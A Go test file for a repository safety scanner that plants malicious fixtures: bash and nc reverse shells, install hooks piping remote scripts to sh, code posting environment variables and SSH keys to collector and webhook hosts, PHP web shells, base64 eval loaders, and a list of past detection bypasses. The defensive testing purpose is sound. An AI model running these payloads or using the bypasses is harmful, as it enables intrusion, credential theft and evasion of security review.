package safety

import (
	"context"
	"fmt"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"

	"github.com/rburns629/urfluency-cli/internal/testutil"
)

func write(t *testing.T, dir string, files map[string]string) {
	t.Helper()
	for name, body := range files {
		p := filepath.Join(dir, filepath.FromSlash(name))
		if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(p, []byte(body), 0o644); err != nil {
			t.Fatal(err)
		}
	}
}

func rulesFound(r Report) map[string]bool {
	out := map[string]bool{}
	for _, f := range r.Findings {
		out[f.Rule] = true
	}
	return out
}

func TestCleanRepository(t *testing.T) {
	dir := t.TempDir()
	write(t, dir, map[string]string{
		"main.go":      "package main\n\nimport \"fmt\"\n\nfunc main() { fmt.Println(\"hello\") }\n",
		"README.md":    "# hello\n\nInstall: `curl -fsSL https://example.com/install.sh | sh`\n",
		"package.json": `{"name":"hello","scripts":{"test":"node test.js"},"dependencies":{"express":"^4.0.0"}}`,
	})
	r, err := Scan(context.Background(), dir, DefaultLimits)
	if err != nil {
		t.Fatal(err)
	}
	// Only the weak docs note: install docs are common, so it costs little and
	// does not change the verdict.
	if r.Verdict != NoIndicators || r.Score < 95 || len(r.Findings) != 1 || r.Findings[0].Rule != "safety.pipe-to-shell-docs" {
		t.Errorf("clean repository: %s %d %+v", r.Verdict, r.Score, r.Findings)
	}
}

func TestMaliciousRepository(t *testing.T) {
	dir := t.TempDir()
	write(t, dir, map[string]string{
		"package.json": `{"name":"evil","scripts":{"postinstall":"node -e \"require('child_process').exec('curl https://x.example/p | sh')\""},` +
			`"dependencies":{"lodahs":"1.0.0","helper":"https://x.example/helper.tgz"}}`,
		"index.js": "const os = require('os');\nconst data = {host: os.hostname(), user: os.userInfo().username};\n" +
			"fetch('https://collector.example/c', {method: 'POST', body: JSON.stringify(process.env)});\n" +
			"const key = require('fs').readFileSync(os.homedir() + '/.ssh/id_rsa');\n" +
			"fetch('https://discord.com/api/webhooks/1/abc', {method:'POST', body: key});\n",
		"steal.py":         "import base64\nexec(base64.b64decode('cHJpbnQoMSk='))\n",
		"run.sh":           "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n(crontab -l; echo '* * * * * /tmp/x') | crontab -\n",
		"setup.py":         "from setuptools import setup\nimport subprocess\nsetup(name='x', cmdclass={'install': Evil})\n",
		"requirements.txt": "reqeusts==2.0\nnumpy==1.0\n",
		"bin/tool":         "\x7fELF\x02\x01\x01\x00\x00\x00binary",
	})
	r, err := Scan(context.Background(), dir, DefaultLimits)
	if err != nil {
		t.Fatal(err)
	}
	want := []string{"safety.npm-install-script", "safety.typosquat", "safety.url-dependency", "safety.env-dump", "safety.identity-beacon",
		"safety.ssh-keys", "safety.chat-webhook", "safety.exec-decoded", "safety.reverse-shell", "safety.cron", "safety.setup-py-hook", "safety.executable"}
	found := rulesFound(r)
	for _, id := range want {
		if !found[id] {
			t.Errorf("missing %s", id)
		}
	}
	if r.Verdict != HighRisk || r.Score > 40 {
		t.Errorf("verdict %s score %d, want high risk at most 40", r.Verdict, r.Score)
	}
	if r.Findings[0].Severity != High {
		t.Errorf("findings should lead with high severity: %+v", r.Findings[0])
	}
}

func TestSecretsAreReportedWithoutValues(t *testing.T) {
	dir := t.TempDir()
	key := "AKIA" + strings.Repeat("Q", 16)
	write(t, dir, map[string]string{"config.py": "AWS_KEY = '" + key + "'\n"})
	r, err := Scan(context.Background(), dir, DefaultLimits)
	if err != nil {
		t.Fatal(err)
	}
	if !rulesFound(r)["sec.aws-key"] && len(r.Findings) == 0 {
		t.Fatalf("secret not found: %+v", r.Findings)
	}
	for _, f := range r.Findings {
		if strings.Contains(f.Evidence, key) {
			t.Errorf("a finding reproduces the secret: %+v", f)
		}
	}
}

func TestLimits(t *testing.T) {
	dir := t.TempDir()
	write(t, dir, map[string]string{"a.js": "1", "b.js": "2", "c.js": "3", "node_modules/x/install.js": "bash -i >& /dev/tcp/1.2.3.4/1 0>&1"})
	r, err := Scan(context.Background(), dir, Limits{MaxFiles: 2, MaxFileSize: 1 << 20})
	if err != nil {
		t.Fatal(err)
	}
	if !r.Truncated || r.Files != 2 {
		t.Errorf("limit: files %d truncated %v", r.Files, r.Truncated)
	}
	if rulesFound(r)["safety.reverse-shell"] {
		t.Error("installed dependencies under node_modules should not be read")
	}
}

func TestValidateURL(t *testing.T) {
	hosts := []string{"github.com", "gitlab.com"}
	ok := map[string]string{
		"https://github.com/owner/repo":      "https://github.com/owner/repo",
		"https://GitHub.com/owner/repo.git/": "https://github.com/owner/repo.git",
	}
	for in, want := range ok {
		if got, err := ValidateURL(in, hosts); err != nil || got != want {
			t.Errorf("ValidateURL(%q) = %q, %v; want %q", in, got, err, want)
		}
	}
	for _, bad := range []string{"http://github.com/o/r", "https://user:pw@github.com/o/r", "https://github.com:8443/o/r", "https://github.com/o",
		"https://evil.example/o/r", "file:///etc", "ext::sh -c id", "https://github.com/o/r?x=1", "https://github.com/-o/r", "https://github.com/o/../r",
		"https://github.com/o/r%3Fx=1", "https://github.com/o/r%23frag", "https://github.com/o/r%0Ax", "https://github.com/o/r%2F..%2Fx"} {
		if _, err := ValidateURL(bad, hosts); err == nil {
			t.Errorf("ValidateURL(%q) accepted", bad)
		}
	}
}

func TestEditDistanceAndTyposquat(t *testing.T) {
	if editDistance("lodahs", "lodash") != 1 || editDistance("reqeusts", "requests") != 1 || editDistance("expres", "express") != 1 || editDistance("react", "vue") != 5 {
		t.Error("edit distance")
	}
	if typosquat("expres", popularNPM) != "express" || typosquat("express", popularNPM) != "" || typosquat("vuex", popularNPM) != "" {
		t.Error("typosquat")
	}
}

func TestTestsAndCISoftened(t *testing.T) {
	dir := t.TempDir()
	write(t, dir, map[string]string{
		".github/workflows/ci.yml": "run: curl -fsSL https://example.com/i.sh | sh\n",
		"tests/helpers.py":         "saved = dict(os.environ)\n",
	})
	r, err := Scan(context.Background(), dir, DefaultLimits)
	if err != nil {
		t.Fatal(err)
	}
	if len(r.Findings) != 2 {
		t.Fatalf("findings = %+v", r.Findings)
	}
	for _, f := range r.Findings {
		if f.Severity != Low || f.Confidence != Weak || !strings.HasPrefix(f.Why, "In ") {
			t.Errorf("not softened: %+v", f)
		}
	}
	if r.Score < 95 {
		t.Errorf("score %d; findings outside runtime code should cost little", r.Score)
	}
}

func TestPHPAndRubyAttacks(t *testing.T) {
	dir := t.TempDir()
	write(t, dir, map[string]string{
		"shell.php":                         "<?php\nif (isset($_POST['c'])) { system($_POST['c']); }\n",
		"loader.php":                        "<?php @eval(base64_decode('ZWNobyAxOw==')); ?>\n",
		"old.php":                           "<?php echo preg_replace('/(.*)/e', 'strtoupper(\"\\\\1\")', $s);\n",
		"composer.json":                     `{"name":"x/y","scripts":{"post-install-cmd":["php -r \"copy('https://x.example/p.php','p.php');\""]}}`,
		"boot.rb":                           "require 'base64'\neval(Base64.decode64('cHV0cyAx'))\n",
		"app/controllers/run_controller.rb": "class RunController < ApplicationController\n  def create\n    system(params[:cmd])\n  end\nend\n",
		"Gemfile":                           "source 'http://rubygems.example'\ngem 'rails'\ngem 'helper', git: 'https://x.example/helper.git'\n",
		"evil.gemspec":                      "Gem::Specification.new do |s|\n  s.name = 'evil'\n  s.extensions = ['ext/extconf.rb']\nend\n",
	})
	r, err := Scan(context.Background(), dir, DefaultLimits)
	if err != nil {
		t.Fatal(err)
	}
	found := rulesFound(r)
	for _, id := range []string{"safety.php-request-exec", "safety.php-eval-decoded", "safety.php-preg-eval", "safety.composer-install-script",
		"safety.ruby-eval-fetched", "safety.ruby-params-exec", "safety.gem-insecure-source", "safety.url-dependency", "safety.gem-native-extension"} {
		if !found[id] {
			t.Errorf("missing %s", id)
		}
	}
	if r.Verdict != HighRisk {
		t.Errorf("verdict %s, want high risk", r.Verdict)
	}
}

// A standard Laravel or Rails project raises nothing worth a review: their own
// Composer scripts are a note, and ordinary code is not a web shell.
func TestCleanPHPAndRubyProjects(t *testing.T) {
	dir := t.TempDir()
	write(t, dir, map[string]string{
		"composer.json": `{"name":"laravel/laravel","scripts":{` +
			`"post-autoload-dump":["Illuminate\\Foundation\\ComposerScripts::postAutoloadDump","@php artisan package:discover --ansi"],` +
			`"post-update-cmd":["@php artisan vendor:publish --tag=laravel-assets --ansi --force"],` +
			`"post-root-package-install":["@php -r \"file_exists('.env') || copy('.env.example', '.env');\""]}}`,
		"app/Http/Controllers/PostController.php": "<?php\n\nnamespace App\\Http\\Controllers;\n\nclass PostController extends Controller\n{\n" +
			"    public function show(string $id)\n    {\n        return view('post', ['post' => Post::findOrFail($id), 'q' => $_GET['q'] ?? '']);\n    }\n}\n",
		"Gemfile":               "source 'https://rubygems.org'\n\ngem 'rails', '~> 8.0'\ngem 'pg'\n",
		"app/models/post.rb":    "class Post < ApplicationRecord\n  validates :title, presence: true\n  def summary = body.truncate(80)\nend\n",
		"lib/tasks/report.rake": "task report: :environment do\n  system('bin/rails', 'stats')\nend\n",
	})
	r, err := Scan(context.Background(), dir, DefaultLimits)
	if err != nil {
		t.Fatal(err)
	}
	if r.Verdict != NoIndicators {
		t.Errorf("clean projects: %s %+v", r.Verdict, r.Findings)
	}
}

// A scanner's own rules name the behavior they look for. Text inside a
// regular expression is a note; the same text anywhere else on the line is not.
func TestPatternsAreNotBehavior(t *testing.T) {
	dir := t.TempDir()
	write(t, dir, map[string]string{
		"rules.go": "var r = []rule{\n" +
			"\t{\"wallets\", High, Possible, regexp.MustCompile(`(?i)(electrum[/\\\\]wallets|wallet\\.dat\\b)`)},\n" +
			"\t{\"cloud\", regexp.MustCompile(`\\.aws/credentials|\\.kube/config`)},\n" +
			"\t{\"cron\", regexp.MustCompile(`\\bcrontab\\s+-|/etc/cron\\.`)},\n}\n",
		"rules.py": "SHELL = re.compile(r\"/dev/tcp/[\\w.-]+/\\d+\")\n",
		"rules.js": "const shell = new RegExp(\"/dev/tcp/1.2.3.4/1\");\n",
	})
	r, err := Scan(context.Background(), dir, DefaultLimits)
	if err != nil {
		t.Fatal(err)
	}
	if r.Verdict != NoIndicators || r.Score < 90 || len(r.Findings) == 0 {
		t.Errorf("rule definitions: %s %d %+v", r.Verdict, r.Score, r.Findings)
	}
	for _, f := range r.Findings {
		if !note(f) || !strings.HasPrefix(f.Why, "Inside a regular expression") {
			t.Errorf("not a pattern note: %+v", f)
		}
	}

	dir = t.TempDir()
	write(t, dir, map[string]string{
		// The pattern comes first, the behavior after it.
		"a.py": "p = re.compile(\"x\"); os.system(\"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\")\n",
		// One match inside a pattern, one outside.
		"b.js": "new RegExp('/dev/tcp/a/1'); exec('bash -i >& /dev/tcp/10.0.0.1/4444 0>&1')\n",
		// An escaped quote does not end the literal early, nor hide what follows it.
		"c.js": "new RegExp(\"a\\\"b\"), exec(\"/dev/tcp/10.0.0.1/4444\")\n",
	})
	r, err = Scan(context.Background(), dir, DefaultLimits)
	if err != nil {
		t.Fatal(err)
	}
	high := map[string]bool{}
	for _, f := range r.Findings {
		if f.Rule == "safety.reverse-shell" && f.Severity == High {
			high[f.Path] = true
		}
	}
	for _, p := range []string{"a.py", "b.js", "c.js"} {
		if !high[p] {
			t.Errorf("%s: behavior beside a pattern was softened: %+v", p, r.Findings)
		}
	}
}

func TestScanRefusesAMissingFolder(t *testing.T) {
	if r, err := Scan(context.Background(), filepath.Join(t.TempDir(), "missing"), DefaultLimits); err == nil {
		t.Errorf("a missing folder scanned as %s", r.Verdict)
	}
}

// Each payload once scored "No indicators found"; each must stay high risk.
func TestLineRuleBypasses(t *testing.T) {
	shell := "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
	js := `require("child_process").exec("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")`
	for name, files := range map[string]map[string]string{
		"echo, then a command":         {"run.sh": "echo hi; " + shell + "\n"},
		"echo with a substitution":     {"run.sh": "echo $(" + shell + ")\n"},
		"Make $(shell) in a message":   {"Makefile": "$(info $(shell " + shell + "))\n"},
		"empty block comment first":    {"index.js": "/**/" + js + "\n"},
		"block comments on both sides": {"index.js": "/**/" + js + "/**/\n"},
		"PowerShell message runs (…)":  {"setup.ps1": "Write-Host (iex (New-Object Net.WebClient).DownloadString('http://evil.example/x.ps1'))\n"},
		"PowerShell message runs @(…)": {"setup.ps1": "Write-Host @(iex (New-Object Net.WebClient).DownloadString('http://evil.example/x.ps1'))\n"},
		"semicolon first in JS":        {"index.js": ";" + js + "\n"},
		"after column 20,000":          {"index.js": strings.Repeat(" ", 20000) + js + "\n"},
		"regex read back as text":      {"x.py": "import os, re\nos.system(re.compile(\"" + shell + "\").pattern)\n"},
		"RegExp source":                {"x.js": "require('child_process').execSync(new RegExp(\"" + shell + "\").source)\n"},
	} {
		dir := t.TempDir()
		write(t, dir, files)
		r, err := Scan(context.Background(), dir, DefaultLimits)
		if err != nil {
			t.Fatal(err)
		}
		if r.Verdict != HighRisk {
			t.Errorf("%s: %s %d %+v", name, r.Verdict, r.Score, r.Findings)
		}
	}
}

// Messages and comments are still not behavior.
func TestLineRuleMessagesAndComments(t *testing.T) {
	dir := t.TempDir()
	write(t, dir, map[string]string{
		"install.sh": "echo \"To uninstall, run: curl -fsSL https://example.com/u.sh | sh\"\n",
		"Makefile":   "$(warning \"no linter in $(PATH), run: curl -sfL https://example.com/i.sh | sh\")\n",
		"a.py":       "# bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n",
		"a.js":       "// bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n/* bash -i >& /dev/tcp/10.0.0.1/4444 0>&1 */\n * bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n",
		"a.sql":      "-- bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n",
	})
	r, err := Scan(context.Background(), dir, DefaultLimits)
	if err != nil {
		t.Fatal(err)
	}
	if r.Verdict != NoIndicators {
		t.Errorf("messages and comments: %s %+v", r.Verdict, r.Findings)
	}
}

func utf16LE(s string, mark bool) string {
	var b []byte
	if mark {
		b = append(b, 0xFF, 0xFE)
	}
	for _, r := range s {
		b = append(b, byte(r), 0)
	}
	return string(b)
}

// Each of these once hid an install hook or a payload from every rule.
func TestEncodingAndManifestBypasses(t *testing.T) {
	shell := "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n"
	for name, c := range map[string]struct {
		files map[string]string
		want  string
	}{
		"NUL on line 1":            {map[string]string{"run.sh": "# \x00\n" + shell}, HighRisk},
		"UTF-16 with a mark":       {map[string]string{"run.ps1": utf16LE(shell, true)}, HighRisk},
		"UTF-16 without a mark":    {map[string]string{"run.ps1": utf16LE(shell, false)}, HighRisk},
		"package.json with a BOM":  {map[string]string{"package.json": "\xEF\xBB\xBF" + `{"scripts":{"postinstall":"node -e x"}}`}, HighRisk},
		"a script that is no text": {map[string]string{"package.json": `{"scripts":{"postinstall":"node -e x","lint":{"cmd":"eslint"}}}`}, HighRisk},
		"prepare":                  {map[string]string{"package.json": `{"scripts":{"prepare":"node -e x"}}`}, HighRisk},
		"binding.gyp command":      {map[string]string{"binding.gyp": `{"targets":[{"target_name":"a","sources":["<!(curl -s https://x.example/a | sh)"]}]}`}, HighRisk},
		"in-tree build backend":    {map[string]string{"pyproject.toml": "[build-system]\nbuild-backend = \"backend\"\nbackend-path = [\".\"]\n"}, ReviewRecommended},
	} {
		dir := t.TempDir()
		write(t, dir, c.files)
		r, err := Scan(context.Background(), dir, DefaultLimits)
		if err != nil {
			t.Fatal(err)
		}
		if r.Verdict != c.want {
			t.Errorf("%s: %s, want %s: %+v", name, r.Verdict, c.want, r.Findings)
		}
	}
}

// Real binaries are still binaries.
func TestBinaryFilesStayBinary(t *testing.T) {
	dir := t.TempDir()
	write(t, dir, map[string]string{"logo.png": "\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"})
	r, err := Scan(context.Background(), dir, DefaultLimits)
	if err != nil {
		t.Fatal(err)
	}
	if r.Verdict != NoIndicators {
		t.Errorf("a PNG was read as text: %s %+v", r.Verdict, r.Findings)
	}
}

func TestIncompleteScans(t *testing.T) {
	hook := `{"scripts":{"postinstall":"node -e x"}}`
	padding := map[string]string{}
	for i := range 5 {
		padding[fmt.Sprintf("a/%d.js", i)] = "1"
	}
	small := Limits{MaxFiles: 3, MaxFileSize: 1 << 10}
	for name, c := range map[string]struct {
		files map[string]string
		want  string
	}{
		"manifest after padding":   {merged(padding, map[string]string{"package.json": hook}), HighRisk},
		"file limit reached":       {padding, ReviewRecommended},
		"a large setup.py":         {map[string]string{"setup.py": strings.Repeat("#\n", 1<<10)}, ReviewRecommended},
		"a large image is no code": {map[string]string{"logo.png": "\x89PNG\r\n\x1a\n\x00" + strings.Repeat("x", 2<<10)}, NoIndicators},
	} {
		dir := t.TempDir()
		write(t, dir, c.files)
		r, err := Scan(context.Background(), dir, small)
		if err != nil {
			t.Fatal(err)
		}
		if r.Verdict != c.want {
			t.Errorf("%s: %s, want %s (files %d, skipped %d, truncated %v): %s", name, r.Verdict, c.want, r.Files, r.Skipped, r.Truncated, r.Caveat)
		}
	}
}

func merged(a, b map[string]string) map[string]string {
	out := map[string]string{}
	for k, v := range a {
		out[k] = v
	}
	for k, v := range b {
		out[k] = v
	}
	return out
}

func TestCommittedDependenciesAreRead(t *testing.T) {
	r := testutil.NewRepo(t)
	r.Commit("a@example.com", "", map[string]string{
		"index.js":                     "require('helper')\n",
		"node_modules/helper/index.js": "require('child_process').exec('bash -i >& /dev/tcp/10.0.0.1/4444 0>&1')\n",
	})
	// Installed but not committed: still not read.
	write(t, r.Dir, map[string]string{"node_modules/installed/index.js": "require('child_process').exec('nc -e /bin/sh 10.0.0.1 4444')\n"})
	rep, err := Scan(context.Background(), r.Dir, DefaultLimits)
	if err != nil {
		t.Fatal(err)
	}
	var found []string
	for _, f := range rep.Findings {
		found = append(found, f.Path)
		if f.Path == "node_modules/helper/index.js" && (f.Severity != Medium || !strings.HasPrefix(f.Why, "In a committed dependency folder")) {
			t.Errorf("not softened one level: %+v", f)
		}
	}
	if !slices.Contains(found, "node_modules/helper/index.js") || slices.Contains(found, "node_modules/installed/index.js") || rep.Verdict != ReviewRecommended {
		t.Errorf("%s, findings in %v; want only the committed dependency, for review", rep.Verdict, found)
	}
}

func TestHTMLScriptsAreCode(t *testing.T) {
	dir := t.TempDir()
	write(t, dir, map[string]string{"index.html": "<script>require('child_process').exec('bash -i >& /dev/tcp/10.0.0.1/4444 0>&1')</script>\n"})
	r, err := Scan(context.Background(), dir, DefaultLimits)
	if err != nil {
		t.Fatal(err)
	}
	if r.Verdict != HighRisk {
		t.Errorf("a script in HTML: %s %+v", r.Verdict, r.Findings)
	}
}
